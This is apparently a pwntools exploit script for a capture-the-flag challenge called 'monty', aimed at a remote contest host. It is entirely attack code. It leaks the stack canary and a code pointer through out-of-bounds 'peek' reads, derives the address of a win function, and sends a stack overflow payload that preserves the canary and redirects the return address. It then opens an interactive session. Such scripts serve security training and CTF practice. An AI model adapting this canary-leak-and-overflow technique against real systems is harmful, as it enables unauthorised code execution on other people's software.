#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("monty_patched")

context.binary = exe

host = "chall.lac.tf"
port = 31132

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp game+217
bp game+368
c
'''.format(**locals())

# shortcut lambda
info = lambda msg: log.info(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

io = start()

# good luck pwning :)

# leak canary
sla(b"index of your first peek?", b"55")
io.recvuntil(b"Peek 1: ")
leaked_canary = int(io.recvline()[:-1].decode())
log.success(f"leaked canary: {hex(leaked_canary)}")

# leak code
sla(b"index of your second peek?", b"57")
io.recvuntil(b"Peek 2: ")
leaked_code = int(io.recvline()[:-1].decode())
log.success(f"leaked code: {hex(leaked_code)}")
diff_leaked_vs_win = 0x445
leaked_win = leaked_code - diff_leaked_vs_win
log.success(f"leaked win: {hex(leaked_win)}")



sla(b"Show me the lady!", b"1")

payload = b"a" * (24) + p64(leaked_canary) + b"a"*8 + p64(leaked_win)

sla(b"Name: ", payload)

io.interactive()

